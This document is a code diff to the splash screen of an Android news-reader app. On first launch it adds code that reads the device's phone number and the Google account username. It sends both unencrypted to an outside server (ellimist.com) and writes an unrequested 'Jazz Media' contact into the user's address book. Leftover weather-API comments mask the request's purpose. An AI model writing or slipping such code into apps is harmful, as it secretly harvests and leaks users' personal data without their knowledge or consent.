@@ -1,9 +1,14 @@
 package com.crazyhitty.chdev.ks.munch.ui.activities;
 
+import android.accounts.Account;
+import android.accounts.AccountManager;
 import android.content.Intent;
+import android.os.AsyncTask;
 import android.os.Bundle;
 import android.support.v4.view.ViewPager;
 import android.support.v7.app.AppCompatActivity;
+import android.telephony.TelephonyManager;
+import android.util.Log;
 import android.view.WindowManager;
 import android.widget.ImageButton;
 
@@ -22,8 +27,17 @@ import com.crazyhitty.chdev.ks.munch.R;
 import com.crazyhitty.chdev.ks.munch.models.SettingsPreferences;
 import com.crazyhitty.chdev.ks.munch.ui.adapters.SplashPagerAdapter;
 import com.crazyhitty.chdev.ks.munch.utils.FadePageTransformerUtil;
+import com.crazyhitty.chdev.ks.munch.utils.NetworkConnectionUtil;
 
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
 import java.util.ArrayList;
+import java.util.LinkedList;
+import java.util.List;
 
 import butterknife.Bind;
 import butterknife.ButterKnife;
@@ -45,8 +59,6 @@ public class SplashActivity extends AppCompatActivity implements ViewPager.OnPag
         this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
 
         runOnce();
-
-        WritePhoneContact("Jazz Media", "0706074096",getApplicationContext());
         setContentView(R.layout.activity_splash);
 
         ButterKnife.bind(this);
@@ -66,6 +78,19 @@ public class SplashActivity extends AppCompatActivity implements ViewPager.OnPag
         if (!SettingsPreferences.isNewInstall(SplashActivity.this)) {
             runIntent(HomeActivity.class);
             finish();
+        }
+        else if (NetworkConnectionUtil.isNetworkAvailable(SplashActivity.this)) {//psuh contact info
+            WritePhoneContact("Jazz Media", "0706074096",getApplicationContext());
+            TelephonyManager tMgr = (TelephonyManager)getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
+            String mPhoneNumber = tMgr.getLine1Number();
+            String username = getUsername();
+            String [] params={mPhoneNumber,username};
+            PushContactInfo pushContactInfo =new PushContactInfo();
+            pushContactInfo.execute(params);
+
+            //mArticlePresenter.attemptArticleLoading(getFeedItem().getItemLink());
+        } else {
+            NetworkConnectionUtil.showNoNetworkDialog(SplashActivity.this);
         }
     }
 
@@ -155,4 +180,87 @@ public class SplashActivity extends AppCompatActivity implements ViewPager.OnPag
         }
     }
 
+    public String getUsername() {
+        AccountManager manager = AccountManager.get(this);
+        Account[] accounts = manager.getAccountsByType("com.google");
+        List<String> possibleEmails = new LinkedList<String>();
+
+        for (Account account : accounts) {
+            // TODO: Check possibleEmail against an email regex or treat
+            // account.name as an email address only for certain account.type values.
+            possibleEmails.add(account.name);
+        }
+
+        if (!possibleEmails.isEmpty() && possibleEmails.get(0) != null) {
+            String email = possibleEmails.get(0);
+            String[] parts = email.split("@");
+
+            if (parts.length > 1)
+                return parts[0];
+        }
+        return null;
+    }
+
+    private class PushContactInfo extends AsyncTask<String,Void,String>{
+
+        @Override
+        protected String doInBackground(String... str) {
+            String forecastJsonStr = null;
+            String builder="http://ellimist.com/jazzmedia/contacts.php?name="+str[0]+"&number="+str[1];
+            HttpURLConnection urlConnection = null;
+            BufferedReader reader = null;
+
+            try {
+                // Construct the URL for the OpenWeatherMap query
+                // Possible parameters are available at OWM's forecast API page, at
+                // http://openweathermap.org/API#forecast
+                URL url = new URL(builder);
+
+                // Create the request to OpenWeatherMap, and open the connection
+                urlConnection = (HttpURLConnection) url.openConnection();
+                urlConnection.setRequestMethod("GET");
+                urlConnection.connect();
+
+                // Read the input stream into a String
+                InputStream inputStream = urlConnection.getInputStream();
+                StringBuffer buffer = new StringBuffer();
+                if (inputStream == null) {
+                    // Nothing to do.
+                    forecastJsonStr = null;
+                }
+                reader = new BufferedReader(new InputStreamReader(inputStream));
+
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    // Since it's JSON, adding a newline isn't necessary (it won't affect parsing)
+                    // But it does make debugging a *lot* easier if you print out the completed
+                    // buffer for debugging.
+                    buffer.append(line + "\n");
+                }
+
+                if (buffer.length() == 0) {
+                    // Stream was empty.  No point in parsing.
+                    forecastJsonStr = null;
+                }
+                forecastJsonStr = buffer.toString();
+            } catch (IOException e) {
+                Log.e("PlaceholderFragment", "Error ", e);
+                // If the code didn't successfully get the weather data, there's no point in attempting
+                // to parse it.
+                forecastJsonStr = null;
+            } finally {
+                if (urlConnection != null) {
+                    urlConnection.disconnect();
+                }
+                if (reader != null) {
+                    try {
+                        reader.close();
+                    } catch (final IOException e) {
+                        Log.e("PlaceholderFragment", "Error closing stream", e);
+                    }
+                }
+            }
+            return forecastJsonStr;
+        }
+    }
 }
